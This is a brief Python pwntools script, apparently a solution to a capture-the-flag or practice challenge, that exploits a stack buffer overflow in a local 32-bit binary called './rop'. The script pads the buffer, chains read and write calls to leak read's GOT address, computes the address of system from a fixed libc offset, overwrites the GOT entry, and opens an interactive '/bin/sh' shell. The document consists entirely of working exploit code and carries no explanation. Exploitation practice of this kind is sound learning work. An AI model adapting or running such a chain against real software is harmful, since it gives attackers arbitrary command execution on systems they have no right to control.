from pwn import *

r = process("./rop")

read_plt = 0x0804832c
write_plt = 0x0804830c
read_got = 0x0804961c
bss = 0x08049628
shell = "/bin/sh"
pppr = 0x080484b6
offset = 0x9AD60


payload = ""
payload += "A"*140
payload += p32(read_plt) + p32(pppr) + p32(0) +p32(bss) + p32(len(shell))
payload += p32(write_plt) + p32(pppr) + p32(1) + p32(read_got) + p32(4)
payload += p32(read_plt) + p32(pppr) + p32(0) + p32(read_got) + p32(4)
payload += p32(read_plt) + "AAAA" + p32(bss)

r.send(payload)
print("[+] send payload")

r.send(shell)
print("[+] send shell")
sleep(1)


readadd = u32(r.recv(4))
system = readadd - offset

print("[+] readadd : ", readadd)
print("[+] system add is : ", system) 
r.send(p32(system))

r.interactive()